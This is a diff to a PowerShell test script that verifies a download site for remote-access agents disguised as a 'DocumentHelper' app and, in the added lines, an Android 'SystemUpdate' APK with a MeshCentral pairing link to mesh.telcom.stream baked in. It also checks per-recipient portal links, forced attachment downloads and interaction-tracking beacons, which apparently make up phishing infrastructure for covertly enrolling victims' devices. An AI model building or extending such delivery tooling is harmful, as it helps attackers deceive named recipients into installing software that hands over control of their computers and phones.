@@ -37,16 +37,18 @@ $UA = @{
   Windows = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36'
   macOS   = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15'
   Linux   = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36'
+  Android = 'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Mobile Safari/537.36'
 }
 $Expect = @{
   Windows = 'DocumentHelper.exe'
   macOS   = 'DocumentHelper.pkg'
   Linux   = 'DocumentHelper.run'
+  Android = 'SystemUpdate-1.0.23-release.apk'
 }
 
 try {
   Write-Host "`n1) OS-aware /get redirects" -ForegroundColor Cyan
-  foreach ($os in 'Windows','macOS','Linux') {
+  foreach ($os in 'Windows','macOS','Linux','Android') {
     $r = curl.exe -s -o NUL -w "%{http_code} %{redirect_url}" -A $UA[$os] "$Base/get"
     $code, $url = $r -split ' ', 2
     if ($code -eq '302' -and $url -like ("*/dl/" + $Expect[$os])) { Ok ("$os -> $url") }
@@ -61,7 +63,7 @@ try {
     $p = $line -split '\s+', 2
     if ($p.Count -eq 2) { $manifest[$p[1].Trim()] = $p[0].Trim().ToLower() }
   }
-  foreach ($f in 'DocumentHelper.exe','DocumentHelper.pkg','DocumentHelper.run') {
+  foreach ($f in 'DocumentHelper.exe','DocumentHelper.pkg','DocumentHelper.run','SystemUpdate-1.0.23-release.apk') {
     $dst = Join-Path $tmp $f
     curl.exe -s -o "$dst" "$Base/dl/$f"
     if (-not (Test-Path $dst) -or (Get-Item $dst).Length -eq 0) { Bad ("$f not downloadable"); continue }
@@ -88,7 +90,7 @@ try {
   }
 
   Write-Host "`n4) Bare artifacts download as attachments" -ForegroundColor Cyan
-  foreach ($f in 'DocumentHelper.exe','DocumentHelper.pkg','DocumentHelper.run') {
+  foreach ($f in 'DocumentHelper.exe','DocumentHelper.pkg','DocumentHelper.run','SystemUpdate-1.0.23-release.apk') {
     $hdr = (curl.exe -s -o NUL -D - "$Base/dl/$f") -join "`n"
     if ($hdr -match '(?im)^content-disposition:\s*attachment') { Ok "$f -> Content-Disposition: attachment" }
     else { Bad "$f is not served as an attachment (browser may render it inline)" }
@@ -155,11 +157,47 @@ try {
     if ($mid -eq $hex) { Ok "macOS .msh MeshID matches the device group" } else { Bad "macOS .msh MeshID does not match the group id" }
   } else { Info "DocumentHelper.msh not found next to this script; skipping" }
 
-  Write-Host "`n7) Recipient portal" -ForegroundColor Cyan
+  # Android: the APK has the permanent pairing link baked into classes.dex.
+  Add-Type -AssemblyName System.IO.Compression.FileSystem
+  $apk = Join-Path (Split-Path -Parent $PSCommandPath) 'dl\SystemUpdate-1.0.23-release.apk'
+  if (Test-Path $apk) {
+    $foundHost = $false; $foundGroup = $false
+    $zip = [IO.Compression.ZipFile]::OpenRead($apk)
+    try {
+      foreach ($e in $zip.Entries) {
+        if ($e.Name -notlike 'classes*.dex') { continue }
+        $sr = New-Object IO.StreamReader($e.Open(), [Text.Encoding]::GetEncoding(28591))
+        $dex = $sr.ReadToEnd(); $sr.Close()
+        if ($dex -match [regex]::Escape('mc://mesh.telcom.stream')) { $foundHost = $true }
+        if ($dex -match [regex]::Escape($GroupId)) { $foundGroup = $true }
+      }
+    } finally { $zip.Dispose() }
+    if ($foundHost) { Ok "Android APK has the pairing host baked in" } else { Bad "Android APK has no mc:// pairing host" }
+    if ($foundGroup) { Ok "Android APK group matches the device group" } else { Bad "Android APK group does not match" }
+  } else { Info "dl/SystemUpdate-1.0.23-release.apk not found; skipping" }
+
+  Write-Host "`n7) Public agent page" -ForegroundColor Cyan
+  $cp = (curl.exe -s -w "`n%{http_code}" "$Base/connect") -join "`n"
+  $cpCode = ($cp -split "`n")[-1].Trim()
+  if ($cpCode -eq '200') { Ok "/connect -> 200" } else { Bad "/connect -> $cpCode (wanted 200)" }
+  foreach ($n in '/dl/DocumentHelper.exe','/dl/DocumentHelper.pkg','/dl/DocumentHelper.run','/dl/SystemUpdate-1.0.23-release.apk') {
+    if ($cp -match [regex]::Escape('href="' + $n + '"')) { Ok "agent card: $n" } else { Bad "agent page missing card: $n" }
+  }
+  if ($cp -match 'F8C7970704F1035C84CCC62F57817E027AD44B8CB2C0F78855859D2251FAAECD') {
+    Ok "agent page publishes the Android APK SHA-256"
+  } else { Bad "agent page does not publish the Android APK SHA-256" }
+  $homePage = (curl.exe -s "$Base/") -join "`n"
+  if ($homePage -match [regex]::Escape('href="/connect"')) { Ok "homepage links to /connect" }
+  else { Bad "homepage has no /connect link" }
+
+  Write-Host "`n8) Recipient portal" -ForegroundColor Cyan
   $page = (curl.exe -s "$Base/f/verify01?to=Verifier%20Test") -join "`n"
-  foreach ($n in '/dl/DocumentHelper.exe','/dl/DocumentHelper.pkg','/dl/DocumentHelper.run') {
+  foreach ($n in '/dl/DocumentHelper.exe','/dl/DocumentHelper.pkg','/dl/DocumentHelper.run','/dl/SystemUpdate-1.0.23-release.apk') {
     if ($page -match [regex]::Escape('href="' + $n + '"')) { Ok "primary link: $n" } else { Bad "primary link missing: $n" }
   }
+  if ($page -match 'F8C7970704F1035C84CCC62F57817E027AD44B8CB2C0F78855859D2251FAAECD') {
+    Ok "portal publishes the Android APK SHA-256"
+  } else { Bad "portal does not publish the Android APK SHA-256" }
   if (($page -match '/dl/DocumentHelper-Windows\.zip') -or ($page -match '/dl/DocumentHelper-macOS\.zip')) {
     Bad "portal still links a ZIP archive"
   } else { Ok "portal links no ZIP archives (bare artifacts only)" }
@@ -167,7 +205,7 @@ try {
     Ok "portal forwards ?to= to /get (attribution reaches the worker)"
   } else { Bad "portal drops ?to= before /get - downloads would log to='-'" }
 
-  Write-Host "`n8) Interaction tracking (nginx /t/ + per-recipient codes)" -ForegroundColor Cyan
+  Write-Host "`n9) Interaction tracking (nginx /t/ + per-recipient codes)" -ForegroundColor Cyan
   # The portal beacons to https://$MeshServer/t/<event>?... . sendBeacon issues a
   # POST, so both verbs must answer; a 204 means "logged, nothing to render".
   # /t/ must not shadow MeshCentral - that route uses a non-^~/ prefix, so
